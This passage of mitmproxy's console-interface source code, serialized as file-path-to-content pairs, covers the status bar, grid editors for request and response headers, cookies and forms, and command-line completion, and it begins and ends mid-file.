len(self.master.options.allow_hosts))\n        if self.master.options.tcp_hosts:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"T\"))\n            r.append(\"CP:%d]\" % len(self.master.options.tcp_hosts))\n        if self.master.options.intercept:\n            r.append(\"[\")\n            if not self.master.options.intercept_active:\n                r.append(\"X\")\n            r.append((\"heading_key\", \"i\"))\n            r.append(\":%s]\" % self.master.options.intercept)\n        if self.master.options.view_filter:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"f\"))\n            r.append(\":%s]\" % self.master.options.view_filter)\n        if self.master.options.stickycookie:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"t\"))\n            r.append(\":%s]\" % self.master.options.stickycookie)\n        if self.master.options.stickyauth:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"u\"))\n            r.append(\":%s]\" % self.master.options.stickyauth)\n        if self.master.options.console_default_contentview != \"auto\":\n            r.append(\n                \"[contentview:%s]\" % (self.master.options.console_default_contentview)\n            )\n        if self.master.options.has_changed(\"view_order\"):\n            r.append(\"[\")\n            r.append((\"heading_key\", \"o\"))\n            r.append(\":%s]\" % self.master.options.view_order)\n\n        opts = []\n        if self.master.options.anticache:\n            opts.append(\"anticache\")\n        if self.master.options.anticomp:\n            opts.append(\"anticomp\")\n        if self.master.options.showhost:\n            opts.append(\"showhost\")\n        if not self.master.options.server_replay_refresh:\n            opts.append(\"norefresh\")\n        if not self.master.options.upstream_cert:\n            opts.append(\"no-upstream-cert\")\n        if self.master.options.console_focus_follow:\n            opts.append(\"following\")\n        if self.master.options.stream_large_bodies:\n            opts.append(self.master.options.stream_large_bodies)\n\n        if opts:\n            r.append(\"[%s]\" % (\":\".join(opts)))\n\n        if self.master.options.mode != [\"regular\"]:\n            if len(self.master.options.mode) == 1:\n                r.append(f\"[{self.master.options.mode[0]}]\")\n            else:\n                r.append(f\"[modes:{len(self.master.options.mode)}]\")\n        if self.master.options.scripts:\n            r.append(\"[scripts:%s]\" % len(self.master.options.scripts))\n\n        if self.master.options.save_stream_file:\n            r.append(\"[W:%s]\" % self.master.options.save_stream_file)\n\n        return r\n\n    def redraw(self) -> None:\n        fc = self.master.commands.execute(\"view.properties.length\")\n        if self.master.view.focus.index is None:\n            offset = 0\n        else:\n            offset = self.master.view.focus.index + 1\n\n        if self.master.options.view_order_reversed:\n            arrow = common.SYMBOL_UP\n        else:\n            arrow = common.SYMBOL_DOWN\n\n        marked = \"\"\n        if self.master.commands.execute(\"view.properties.marked\"):\n            marked = \"M\"\n\n        t: list[tuple[str, str] | str] = [\n            (\"heading\", f\"{arrow} {marked} [{offset}/{fc}]\".ljust(11)),\n        ]\n\n        listen_addrs: list[str] = list(\n            dict.fromkeys(\n                human.format_address(a)\n                for a in self.master.addons.get(\"proxyserver\").listen_addrs()\n            )\n        )\n        if listen_addrs:\n            boundaddr = f\"[{', '.join(listen_addrs)}]\"\n        else:\n            boundaddr = \"\"\n        t.extend(self.get_status())\n        status = urwid.AttrWrap(\n            urwid.Columns(\n                [\n                    urwid.Text(t),\n                    urwid.Text(boundaddr, align=\"right\"),\n                ]\n            ),\n            \"heading\",\n        )\n        self.ib._w = status\n\n    def selectable(self) -> bool:\n        return True\n", "mitmproxy/tools/console/grideditor/col_viewany.py": "\"\"\"\nA display-only column that displays any data type.\n\"\"\"\n\nfrom typing import Any\n\nimport urwid\n\nfrom mitmproxy.tools.console.grideditor import base\nfrom mitmproxy.utils import strutils\n\n\nclass Column(base.Column):\n    def Display(self, data):\n        return Display(data)\n\n    Edit = Display\n\n    def blank(self):\n        return \"\"\n\n\nclass Display(base.Cell):\n    def __init__(self, data: Any) -> None:\n        self.data = data\n        if isinstance(data, bytes):\n            data = strutils.bytes_to_escaped_str(data)\n        if not isinstance(data, str):\n            data = repr(data)\n        w = urwid.Text(data, wrap=\"any\")\n        super().__init__(w)\n\n    def get_data(self) -> Any:\n        return self.data\n", "mitmproxy/tools/console/grideditor/base.py": "import abc\nimport copy\nimport os\nfrom collections.abc import Callable\nfrom collections.abc import Container\nfrom collections.abc import Iterable\nfrom collections.abc import MutableSequence\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import ClassVar\nfrom typing import Literal\nfrom typing import overload\n\nimport urwid\n\nimport mitmproxy.tools.console.master\nfrom mitmproxy import exceptions\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.utils import strutils\n\n\n@overload\ndef read_file(filename: str, escaped: Literal[True]) -> bytes: ...\n\n\n@overload\ndef read_file(filename: str, escaped: Literal[False]) -> str: ...\n\n\ndef read_file(filename: str, escaped: bool) -> bytes | str:\n    filename = os.path.expanduser(filename)\n    try:\n        with open(filename, \"r\" if escaped else \"rb\") as f:\n            d = f.read()\n    except OSError as v:\n        raise exceptions.CommandError(v)\n    if escaped:\n        try:\n            d = strutils.escaped_str_to_bytes(d)\n        except ValueError:\n            raise exceptions.CommandError(\"Invalid Python-style string encoding.\")\n    return d\n\n\nclass Cell(urwid.WidgetWrap):\n    def get_data(self):\n        \"\"\"\n        Raises:\n            ValueError, if the current content is invalid.\n        \"\"\"\n        raise NotImplementedError()\n\n    def selectable(self):\n        return True\n\n\nclass Column(metaclass=abc.ABCMeta):\n    subeditor: urwid.Edit = None\n\n    def __init__(self, heading):\n        self.heading = heading\n\n    @abc.abstractmethod\n    def Display(self, data) -> Cell:\n        pass\n\n    @abc.abstractmethod\n    def Edit(self, data) -> Cell:\n        pass\n\n    @abc.abstractmethod\n    def blank(self) -> Any:\n        pass\n\n    def keypress(self, key: str, editor: \"GridEditor\") -> str | None:\n        return key\n\n\nclass GridRow(urwid.WidgetWrap):\n    def __init__(\n        self,\n        focused: int | None,\n        editing: bool,\n        editor: \"GridEditor\",\n        values: tuple[Iterable[bytes], Container[int]],\n    ) -> None:\n        self.focused = focused\n        self.editor = editor\n        self.edit_col: Cell | None = None\n\n        errors = values[1]\n        self.fields: Sequence[Any] = []\n        for i, v in enumerate(values[0]):\n            if focused == i and editing:\n                self.edit_col = self.editor.columns[i].Edit(v)\n                self.fields.append(self.edit_col)\n            else:\n                w = self.editor.columns[i].Display(v)\n                if focused == i:\n                    if i in errors:\n                        w = urwid.AttrWrap(w, \"focusfield_error\")\n                    else:\n                        w = urwid.AttrWrap(w, \"focusfield\")\n                elif i in errors:\n                    w = urwid.AttrWrap(w, \"field_error\")\n                self.fields.append(w)\n\n        fspecs = self.fields[:]\n        if len(self.fields) > 1:\n            fspecs[0] = (\"fixed\", self.editor.first_width + 2, fspecs[0])\n        w = urwid.Columns(fspecs, dividechars=2)\n        if focused is not None:\n            w.set_focus_column(focused)\n        super().__init__(w)\n\n    def keypress(self, s, k):\n        if self.edit_col:\n            w = self._w.column_widths(s)[self.focused]\n            k = self.edit_col.keypress((w,), k)\n        return k\n\n    def selectable(self):\n        return True\n\n\nclass GridWalker(urwid.ListWalker):\n    \"\"\"\n    Stores rows as a list of (rows, errors) tuples, where rows is a list\n    and errors is a set with an entry of each offset in rows that is an\n    error.\n    \"\"\"\n\n    def __init__(self, lst: Iterable[list], editor: \"GridEditor\") -> None:\n        self.lst: MutableSequence[tuple[Any, set]] = [(i, set()) for i in lst]\n        self.editor = editor\n        self.focus = 0\n        self.focus_col = 0\n        self.edit_row: GridRow | None = None\n\n    def _modified(self):\n        self.editor.show_empty_msg()\n        return super()._modified()\n\n    def add_value(self, lst):\n        self.lst.append((lst[:], set()))\n        self._modified()\n\n    def get_current_value(self):\n        if self.lst:\n            return self.lst[self.focus][0][self.focus_col]\n\n    def set_current_value(self, val) -> None:\n        errors = self.lst[self.focus][1]\n        emsg = self.editor.is_error(self.focus_col, val)\n        if emsg:\n            signals.status_message.send(message=emsg)\n            errors.add(self.focus_col)\n        else:\n            errors.discard(self.focus_col)\n        self.set_value(val, self.focus, self.focus_col, errors)\n\n    def set_value(self, val, focus, focus_col, errors=None):\n        if not errors:\n            errors = set()\n        row = list(self.lst[focus][0])\n        row[focus_col] = val\n        self.lst[focus] = [tuple(row), errors]  # type: ignore\n        self._modified()\n\n    def delete_focus(self):\n        if self.lst:\n            del self.lst[self.focus]\n            self.focus = min(len(self.lst) - 1, self.focus)\n            self._modified()\n\n    def _insert(self, pos):\n        self.focus = pos\n        self.lst.insert(self.focus, ([c.blank() for c in self.editor.columns], set()))\n        self.focus_col = 0\n        self.start_edit()\n\n    def insert(self):\n        return self._insert(self.focus)\n\n    def add(self):\n        return self._insert(min(self.focus + 1, len(self.lst)))\n\n    def start_edit(self):\n        col = self.editor.columns[self.focus_col]\n        if self.lst and not col.subeditor:\n            self.edit_row = GridRow(\n                self.focus_col, True, self.editor, self.lst[self.focus]\n            )\n            self._modified()\n\n    def stop_edit(self):\n        if self.edit_row and self.edit_row.edit_col:\n            try:\n                val = self.edit_row.edit_col.get_data()\n            except ValueError:\n                return\n            self.edit_row = None\n            self.set_current_value(val)\n\n    def left(self):\n        self.focus_col = max(self.focus_col - 1, 0)\n        self._modified()\n\n    def right(self):\n        self.focus_col = min(self.focus_col + 1, len(self.editor.columns) - 1)\n        self._modified()\n\n    def tab_next(self):\n        self.stop_edit()\n        if self.focus_col < len(self.editor.columns) - 1:\n            self.focus_col += 1\n        elif self.focus != len(self.lst) - 1:\n            self.focus_col = 0\n            self.focus += 1\n        self._modified()\n\n    def get_focus(self):\n        if self.edit_row:\n            return self.edit_row, self.focus\n        elif self.lst:\n            return (\n                GridRow(self.focus_col, False, self.editor, self.lst[self.focus]),\n                self.focus,\n            )\n        else:\n            return None, None\n\n    def set_focus(self, focus):\n        self.stop_edit()\n        self.focus = focus\n        self._modified()\n\n    def get_next(self, pos):\n        if pos + 1 >= len(self.lst):\n            return None, None\n        return GridRow(None, False, self.editor, self.lst[pos + 1]), pos + 1\n\n    def get_prev(self, pos):\n        if pos - 1 < 0:\n            return None, None\n        return GridRow(None, False, self.editor, self.lst[pos - 1]), pos - 1\n\n\nclass GridListBox(urwid.ListBox):\n    def __init__(self, lw):\n        super().__init__(lw)\n\n\nFIRST_WIDTH_MAX = 40\n\n\nclass BaseGridEditor(urwid.WidgetWrap):\n    title: str = \"\"\n    keyctx: ClassVar[str] = \"grideditor\"\n\n    def __init__(\n        self,\n        master: \"mitmproxy.tools.console.master.ConsoleMaster\",\n        title,\n        columns,\n        value: Any,\n        callback: Callable[..., None],\n        *cb_args,\n        **cb_kwargs,\n    ) -> None:\n        value = self.data_in(copy.deepcopy(value))\n        self.master = master\n        self.title = title\n        self.columns = columns\n        self.value = value\n        self.callback = callback\n        self.cb_args = cb_args\n        self.cb_kwargs = cb_kwargs\n\n        first_width = 20\n        if value:\n            for r in value:\n                assert len(r) == len(self.columns)\n                first_width = max(len(r), first_width)\n        self.first_width = min(first_width, FIRST_WIDTH_MAX)\n\n        h = None\n        if any(col.heading for col in self.columns):\n            headings = []\n            for i, col in enumerate(self.columns):\n                c = urwid.Text(col.heading)\n                if i == 0 and len(self.columns) > 1:\n                    headings.append((\"fixed\", first_width + 2, c))\n                else:\n                    headings.append(c)\n            h = urwid.Columns(headings, dividechars=2)\n            h = urwid.AttrWrap(h, \"heading\")\n\n        self.walker = GridWalker(self.value, self)\n        self.lb = GridListBox(self.walker)\n        w = urwid.Frame(self.lb, header=h)\n\n        super().__init__(w)\n        self.show_empty_msg()\n\n    def layout_popping(self):\n        res = []\n        for i in self.walker.lst:\n            if not i[1] and any([x for x in i[0]]):\n                res.append(i[0])\n        self.callback(self.data_out(res), *self.cb_args, **self.cb_kwargs)\n\n    def show_empty_msg(self):\n        if self.walker.lst:\n            self._w.set_footer(None)\n        else:\n            self._w.set_footer(\n                urwid.Text(\n                    [\n                        (\"highlight\", \"No values - you should add some. Press \"),\n                        (\"key\", \"?\"),\n                        (\"highlight\", \" for help.\"),\n                    ]\n                )\n            )\n\n    def set_subeditor_value(self, val, focus, focus_col):\n        self.walker.set_value(val, focus, focus_col)\n\n    def keypress(self, size, key):\n        if self.walker.edit_row:\n            if key == \"esc\":\n                self.walker.stop_edit()\n            elif key == \"tab\":\n                pf, pfc = self.walker.focus, self.walker.focus_col\n                self.walker.tab_next()\n                if self.walker.focus == pf and self.walker.focus_col != pfc:\n                    self.walker.start_edit()\n            else:\n                self._w.keypress(size, key)\n            return None\n\n        column = self.columns[self.walker.focus_col]\n        if key == \"m_start\":\n            self.walker.set_focus(0)\n        elif key == \"m_next\":\n            self.walker.tab_next()\n        elif key == \"m_end\":\n            self.walker.set_focus(len(self.walker.lst) - 1)\n        elif key == \"left\":\n            self.walker.left()\n        elif key == \"right\":\n            self.walker.right()\n        elif column.keypress(key, self) and not self.handle_key(key):\n            return self._w.keypress(size, key)\n\n    def data_out(self, data: Sequence[list]) -> Any:\n        \"\"\"\n        Called on raw list data, before data is returned through the\n        callback.\n        \"\"\"\n        return data\n\n    def data_in(self, data: Any) -> Iterable[list]:\n        \"\"\"\n        Called to prepare provided data.\n        \"\"\"\n        return data\n\n    def is_error(self, col: int, val: Any) -> str | None:\n        \"\"\"\n        Return None, or a string error message.\n        \"\"\"\n        return None\n\n    def handle_key(self, key):\n        return False\n\n    def cmd_add(self):\n        self.walker.add()\n\n    def cmd_insert(self):\n        self.walker.insert()\n\n    def cmd_delete(self):\n        self.walker.delete_focus()\n\n    def cmd_read_file(self, path):\n        self.walker.set_current_value(read_file(path, False))\n\n    def cmd_read_file_escaped(self, path):\n        self.walker.set_current_value(read_file(path, True))\n\n    def cmd_spawn_editor(self):\n        o = self.walker.get_current_value()\n        if o is not None:\n            n = self.master.spawn_editor(o)\n            n = strutils.clean_hanging_newline(n)\n            self.walker.set_current_value(n)\n\n\nclass GridEditor(BaseGridEditor):\n    title = \"\"\n    columns: Sequence[Column] = ()\n    keyctx: ClassVar[str] = \"grideditor\"\n\n    def __init__(\n        self,\n        master: \"mitmproxy.tools.console.master.ConsoleMaster\",\n        value: Any,\n        callback: Callable[..., None],\n        *cb_args,\n        **cb_kwargs,\n    ) -> None:\n        super().__init__(\n            master, self.title, self.columns, value, callback, *cb_args, **cb_kwargs\n        )\n\n\nclass FocusEditor(urwid.WidgetWrap, layoutwidget.LayoutWidget):\n    \"\"\"\n    A specialised GridEditor that edits the current focused flow.\n    \"\"\"\n\n    keyctx: ClassVar[str] = \"grideditor\"\n\n    def __init__(self, master):\n        self.master = master\n\n    def call(self, v, name, *args, **kwargs):\n        f = getattr(v, name, None)\n        if f:\n            f(*args, **kwargs)\n\n    def get_data(self, flow):\n        \"\"\"\n        Retrieve the data to edit from the current flow.\n        \"\"\"\n        raise NotImplementedError\n\n    def set_data(self, vals, flow):\n        \"\"\"\n        Set the current data on the flow.\n        \"\"\"\n        raise NotImplementedError\n\n    def set_data_update(self, vals, flow) -> None:\n        self.set_data(vals, flow)\n        signals.flow_change.send(flow=flow)\n\n    def key_responder(self):\n        return self._w\n\n    def layout_popping(self):\n        self.call(self._w, \"layout_popping\")\n\n    def layout_pushed(self, prev):\n        if self.master.view.focus.flow:\n            self._w = BaseGridEditor(\n                self.master,\n                self.title,\n                self.columns,\n                self.get_data(self.master.view.focus.flow),\n                self.set_data_update,\n                self.master.view.focus.flow,\n            )\n        else:\n            self._w = urwid.Pile([])\n", "mitmproxy/tools/console/grideditor/col_subgrid.py": "import urwid\n\nfrom mitmproxy.net.http import cookies\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console.grideditor import base\n\n\nclass Column(base.Column):\n    def __init__(self, heading, subeditor):\n        super().__init__(heading)\n        self.subeditor = subeditor\n\n    def Edit(self, data):\n        raise RuntimeError(\"SubgridColumn should handle edits itself\")\n\n    def Display(self, data):\n        return Display(data)\n\n    def blank(self):\n        return []\n\n    def keypress(self, key: str, editor):\n        if key in \"rRe\":\n            signals.status_message.send(message=\"Press enter to edit this field.\")\n            return\n        elif key == \"m_select\":\n            self.subeditor.grideditor = editor\n            editor.master.switch_view(\"edit_focus_setcookie_attrs\")\n        else:\n            return key\n\n\nclass Display(base.Cell):\n    def __init__(self, data):\n        p = cookies._format_pairs(data, sep=\"\\n\")\n        w = urwid.Text(p)\n        super().__init__(w)\n\n    def get_data(self):\n        pass\n", "mitmproxy/tools/console/grideditor/col_bytes.py": "import urwid\n\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console.grideditor import base\nfrom mitmproxy.utils import strutils\n\n\nclass Column(base.Column):\n    def Display(self, data):\n        return Display(data)\n\n    def Edit(self, data):\n        return Edit(data)\n\n    def blank(self):\n        return b\"\"\n\n    def keypress(self, key, editor):\n        if key in [\"m_select\"]:\n            editor.walker.start_edit()\n        else:\n            return key\n\n\nclass Display(base.Cell):\n    def __init__(self, data: bytes) -> None:\n        self.data = data\n        escaped = strutils.bytes_to_escaped_str(data)\n        w = urwid.Text(escaped, wrap=\"any\")\n        super().__init__(w)\n\n    def get_data(self) -> bytes:\n        return self.data\n\n\nclass Edit(base.Cell):\n    def __init__(self, data: bytes) -> None:\n        d = strutils.bytes_to_escaped_str(data)\n        w = urwid.Edit(edit_text=d, wrap=\"any\", multiline=True)\n        w = urwid.AttrWrap(w, \"editfield\")\n        super().__init__(w)\n\n    def get_data(self) -> bytes:\n        txt = self._w.get_text()[0].strip()\n        try:\n            return strutils.escaped_str_to_bytes(txt)\n        except ValueError:\n            signals.status_message.send(message=\"Invalid data.\")\n            raise\n", "mitmproxy/tools/console/grideditor/__init__.py": "from . import base\nfrom .editors import CookieAttributeEditor\nfrom .editors import CookieEditor\nfrom .editors import DataViewer\nfrom .editors import OptionsEditor\nfrom .editors import PathEditor\nfrom .editors import QueryEditor\nfrom .editors import RequestHeaderEditor\nfrom .editors import RequestMultipartEditor\nfrom .editors import RequestUrlEncodedEditor\nfrom .editors import ResponseHeaderEditor\nfrom .editors import SetCookieEditor\n\n__all__ = [\n    \"base\",\n    \"QueryEditor\",\n    \"RequestHeaderEditor\",\n    \"ResponseHeaderEditor\",\n    \"RequestMultipartEditor\",\n    \"RequestUrlEncodedEditor\",\n    \"PathEditor\",\n    \"CookieEditor\",\n    \"CookieAttributeEditor\",\n    \"SetCookieEditor\",\n    \"OptionsEditor\",\n    \"DataViewer\",\n]\n", "mitmproxy/tools/console/grideditor/editors.py": "from typing import Any\n\nimport urwid\n\nfrom mitmproxy import exceptions\nfrom mitmproxy.http import Headers\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console.grideditor import base\nfrom mitmproxy.tools.console.grideditor import col_bytes\nfrom mitmproxy.tools.console.grideditor import col_subgrid\nfrom mitmproxy.tools.console.grideditor import col_text\nfrom mitmproxy.tools.console.grideditor import col_viewany\n\n\nclass QueryEditor(base.FocusEditor):\n    title = \"Edit Query\"\n    columns = [col_text.Column(\"Key\"), col_text.Column(\"Value\")]\n\n    def get_data(self, flow):\n        return flow.request.query.items(multi=True)\n\n    def set_data(self, vals, flow):\n        flow.request.query = vals\n\n\nclass HeaderEditor(base.FocusEditor):\n    columns = [col_bytes.Column(\"Key\"), col_bytes.Column(\"Value\")]\n\n\nclass RequestHeaderEditor(HeaderEditor):\n    title = \"Edit Request Headers\"\n\n    def get_data(self, flow):\n        return flow.request.headers.fields\n\n    def set_data(self, vals, flow):\n        flow.request.headers = Headers(vals)\n\n\nclass ResponseHeaderEditor(HeaderEditor):\n    title = \"Edit Response Headers\"\n\n    def get_data(self, flow):\n        return flow.response.headers.fields\n\n    def set_data(self, vals, flow):\n        flow.response.headers = Headers(vals)\n\n\nclass RequestMultipartEditor(base.FocusEditor):\n    title = \"Edit Multipart Form\"\n    columns = [col_bytes.Column(\"Key\"), col_bytes.Column(\"Value\")]\n\n    def get_data(self, flow):\n        return flow.request.multipart_form.items(multi=True)\n\n    def set_data(self, vals, flow):\n        flow.request.multipart_form = vals\n\n\nclass RequestUrlEncodedEditor(base.FocusEditor):\n    title = \"Edit UrlEncoded Form\"\n    columns = [col_text.Column(\"Key\"), col_text.Column(\"Value\")]\n\n    def get_data(self, flow):\n        return flow.request.urlencoded_form.items(multi=True)\n\n    def set_data(self, vals, flow):\n        flow.request.urlencoded_form = vals\n\n\nclass PathEditor(base.FocusEditor):\n    # TODO: Next row on enter?\n    title = \"Edit Path Components\"\n    columns = [\n        col_text.Column(\"Component\"),\n    ]\n\n    def data_in(self, data):\n        return [[i] for i in data]\n\n    def data_out(self, data):\n        return [i[0] for i in data]\n\n    def get_data(self, flow):\n        return self.data_in(flow.request.path_components)\n\n    def set_data(self, vals, flow):\n        flow.request.path_components = self.data_out(vals)\n\n\nclass CookieEditor(base.FocusEditor):\n    title = \"Edit Cookies\"\n    columns = [\n        col_text.Column(\"Name\"),\n        col_text.Column(\"Value\"),\n    ]\n\n    def get_data(self, flow):\n        return flow.request.cookies.items(multi=True)\n\n    def set_data(self, vals, flow):\n        flow.request.cookies = vals\n\n\nclass CookieAttributeEditor(base.FocusEditor):\n    title = \"Editing Set-Cookie attributes\"\n    columns = [\n        col_text.Column(\"Name\"),\n        col_text.Column(\"Value\"),\n    ]\n    grideditor: base.BaseGridEditor\n\n    def data_in(self, data):\n        return [(k, v or \"\") for k, v in data]\n\n    def data_out(self, data):\n        ret = []\n        for i in data:\n            if not i[1]:\n                ret.append([i[0], None])\n            else:\n                ret.append(i)\n        return ret\n\n    def layout_pushed(self, prev):\n        if self.grideditor.master.view.focus.flow:\n            self._w = base.BaseGridEditor(\n                self.grideditor.master,\n                self.title,\n                self.columns,\n                self.grideditor.walker.get_current_value(),\n                self.grideditor.set_subeditor_value,\n                self.grideditor.walker.focus,\n                self.grideditor.walker.focus_col,\n            )\n        else:\n            self._w = urwid.Pile([])\n\n\nclass SetCookieEditor(base.FocusEditor):\n    title = \"Edit SetCookie Header\"\n    columns = [\n        col_text.Column(\"Name\"),\n        col_text.Column(\"Value\"),\n        col_subgrid.Column(\"Attributes\", CookieAttributeEditor),\n    ]\n\n    def data_in(self, data):\n        flattened = []\n        for key, (value, attrs) in data:\n            flattened.append([key, value, attrs.items(multi=True)])\n        return flattened\n\n    def data_out(self, data):\n        vals = []\n        for key, value, attrs in data:\n            vals.append([key, (value, attrs)])\n        return vals\n\n    def get_data(self, flow):\n        return self.data_in(flow.response.cookies.items(multi=True))\n\n    def set_data(self, vals, flow):\n        flow.response.cookies = self.data_out(vals)\n\n\nclass OptionsEditor(base.GridEditor, layoutwidget.LayoutWidget):\n    title = \"\"\n    columns = [col_text.Column(\"\")]\n\n    def __init__(self, master, name, vals):\n        self.name = name\n        super().__init__(master, [[i] for i in vals], self.callback)\n\n    def callback(self, vals) -> None:\n        try:\n            setattr(self.master.options, self.name, [i[0] for i in vals])\n        except exceptions.OptionsError as v:\n            signals.status_message.send(message=str(v))\n\n    def is_error(self, col, val):\n        pass\n\n\nclass DataViewer(base.GridEditor, layoutwidget.LayoutWidget):\n    title = \"\"\n\n    def __init__(\n        self,\n        master,\n        vals: (list[list[Any]] | list[Any] | Any),\n    ) -> None:\n        if vals is not None:\n            # Whatever vals is, make it a list of rows containing lists of column values.\n            if not isinstance(vals, list):\n                vals = [vals]\n            if not isinstance(vals[0], list):\n                vals = [[i] for i in vals]\n\n            self.columns = [col_viewany.Column(\"\")] * len(vals[0])\n        super().__init__(master, vals, self.callback)\n\n    def callback(self, vals):\n        pass\n\n    def is_error(self, col, val):\n        pass\n", "mitmproxy/tools/console/grideditor/col_text.py": "\"\"\"\nWelcome to the encoding dance!\n\nIn a nutshell, text columns are actually a proxy class for byte columns,\nwhich just encode/decodes contents.\n\"\"\"\n\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console.grideditor import col_bytes\n\n\nclass Column(col_bytes.Column):\n    def __init__(self, heading, encoding=\"utf8\", errors=\"surrogateescape\"):\n        super().__init__(heading)\n        self.encoding_args = encoding, errors\n\n    def Display(self, data):\n        return TDisplay(data, self.encoding_args)\n\n    def Edit(self, data):\n        return TEdit(data, self.encoding_args)\n\n    def blank(self):\n        return \"\"\n\n\n# This is the same for both edit and display.\nclass EncodingMixin:\n    def __init__(self, data, encoding_args):\n        self.encoding_args = encoding_args\n        super().__init__(str(data).encode(*self.encoding_args))  # type: ignore\n\n    def get_data(self):\n        data = super().get_data()  # type: ignore\n        try:\n            return data.decode(*self.encoding_args)\n        except ValueError:\n            signals.status_message.send(message=\"Invalid encoding.\")\n            raise\n\n\n# urwid forces a different name for a subclass.\nclass TDisplay(EncodingMixin, col_bytes.Display):\n    pass\n\n\nclass TEdit(EncodingMixin, col_bytes.Edit):\n    pass\n", "mitmproxy/tools/console/commander/commander.py": "import abc\nfrom collections.abc import Sequence\nfrom typing import NamedTuple\n\nimport urwid\nfrom urwid.text_layout import calc_coords\n\nimport mitmproxy.command\nimport mitmproxy.flow\nimport mitmproxy.master\nimport mitmproxy.types\n\n\nclass Completer:\n    @abc.abstractmethod\n    def cycle(self, forward: bool = True) -> str:\n        raise NotImplementedError()\n\n\nclass ListCompleter(Completer):\n    def __init__(\n        self,\n        start: str,\n        options: Sequence[str],\n    ) -> None:\n        self.start = start\n        self.options: list[str] = []\n        for o in options:\n            if o.startswith(start):\n                self.options.append(o)\n        self.options.sort()\n        self.pos = -1\n\n    def cycle(self, forward: bool = True) -> str:\n        if not self.options:\n            return self.start\n        if self.pos == -1:\n            self.pos = 0 if forward else len(self.options) - 1\n        else:\n            delta = 1 if forward else -1\n            self.pos = (self.pos + delta) % len(self.options)\n        return self.options[self.pos]\n\n\nclass CompletionState(NamedTuple):\n    completer: Completer\n    parsed: Sequence[mitmproxy.command.ParseResult]\n\n\nclass CommandBuffer:\n    def __init__(self, master: mitmproxy.master.Master, start: str = \"\") -> None:\n        self.master = master\n        self.text = start\n        # Cursor is always within the range [0:len(buffer)].\n        self._cursor = len(self.text)\n        self.completion: CompletionState | None = None\n\n    @property\n    def cursor(self) -> int:\n        return self._cursor\n\n    @cursor.setter\n    def cursor(self, x) -> None:\n        if x < 0:\n            self._cursor = 0\n        elif x > len(self.text):\n            self._cursor = len(self.text)\n        else:\n            self._cursor = x\n\n    def set_text(self, text: str) -> None:\n        self.text = text\n        self._cursor = len(self.text)\n        self.render()\n\n    def render(self):\n        parts, remaining = self.master.commands.parse_partial(self.text)\n        ret = []\n        if not parts:\n            # Means we just received the leader, so we need to give a blank\n            # text to the widget to render or it crashes\n            ret.append((\"text\", \"\"))\n        else:\n            for p in parts:\n                if p.valid:\n                    if p.type == mitmproxy.types.Cmd:\n                        ret.append((\"commander_command\", p.value))\n                    else:\n                        ret.append((\"text\", p.value))\n                elif p.value:\n                    ret.append((\"commander_invalid\", p.value))\n\n            if remaining:\n                if parts[-1].type != mitmproxy.types.Space:\n                    ret.append((\"text\", \" \"))\n                for param in remaining:\n                    ret.append((\"commander_hint\", f\"{param} \"))\n\n        return ret\n\n    def left(self) -> None:\n        self.cursor = self.cursor - 1\n\n    def right(self) -> None:\n        self.cursor = self.cursor + 1\n\n    def cycle_completion(self, forward: bool = True) -> None:\n        if not self.completion:\n            parts, remaining = self.master.commands.parse_partial(\n                self.text[: self.cursor]\n            )\n            if parts and parts[-1].type != mitmproxy.types.Space:\n                type_to_complete = parts[-1].type\n                cycle_prefix = parts[-1].value\n                parsed = parts[:-1]\n            elif remaining:\n                type_to_complete = remaining[0].type\n                cycle_prefix = \"\"\n                parsed = parts\n            else:\n                return\n            ct = mitmproxy.types.CommandTypes.get(type_to_complete, None)\n            if ct:\n                self.completion = CompletionState(\n                    completer=ListCompleter(\n                        cycle_prefix,\n                        ct.completion(\n                            self.master.commands, type_to_complete, cycle_prefix\n                        ),\n                    ),\n                    parsed=parsed,\n                )\n        if self.completion:\n            nxt = self.completion.completer.cycle(forward)\n            buf = \"\".join([i.value for i in self.completion.parsed]) + nxt\n            self.text = buf\n            self.cursor = len(self.text)\n\n    def backspace(self) -> None:\n        if self.cursor == 0:\n            return\n        self.text = self.text[: self.cursor - 1] + self.text[self.cursor :]\n        self.cursor = self.cursor - 1\n        self.completion = None\n\n    def delete(self) -> None:\n        if self.cursor == len(self.text):\n            return\n        self.text = self.text[: self.cursor] + self.text[self.cursor + 1 :]\n        self.completion = None\n\n    def insert(self, k: str) -> None:\n        \"\"\"\n        Inserts text at the cursor.\n        \"\"\"\n\n        # We don't want to insert a space before the command\n        if k == \" \" and self.text[0 : self.cursor].strip() == \"\":\n            return\n\n        self.text = self.text[: self.cursor] + k + self.text[self.cursor :]\n        self.cursor += len(k)\n        self.completion = None\n\n\nclass CommandEdit(urwid.WidgetWrap):\n    leader = \": \"\n\n    def __init__(self, master: mitmproxy.master.Master, text: str) -> None:\n        super().__init__(urwid.Text(self.leader))\n        self.master = master\n        self.active_filter = False\n        self.filter_str = \"\"\n        self.cbuf = CommandBuffer(master, text)\n        self.update()\n\n    def keypress(self, size, key) -> None:\n        if key == \"delete\":\n            self.cbuf.delete()\n        elif key == \"ctrl a\" or key == \"home\":\n            self.cbuf.cursor = 0\n        elif key == \"ctrl e\" or key == \"end\":\n            self.cbuf.cursor = len(self.cbuf.text)\n        elif key == \"meta b\":\n            self.cbuf.cursor = self.cbuf.text.rfind(\" \", 0, self.cbuf.cursor)\n        elif key == \"meta f\":\n            pos = self.cbuf.text.find(\" \", self.cbuf.cursor + 1)\n            if pos == -1:\n                pos = len(self.cbuf.text)\n            self.cbuf.cursor = pos\n        elif key == \"ctrl w\":\n            prev_cursor = self.cbuf.cursor\n            pos = self.cbuf.text.rfind(\" \", 0, self.cbuf.cursor - 1)\n            if pos == -1:\n                new_text = self.cbuf.text[self.cbuf.cursor :]\n                cursor_pos = 0\n            else:\n                txt_after = self.cbuf.text[self.cbuf.cursor :]\n                txt_before = self.cbuf.text[0:pos]\n                new_text = f\"{txt_before} {txt_after}\"\n                cursor_pos = prev_cursor - (prev_cursor - pos) + 1\n            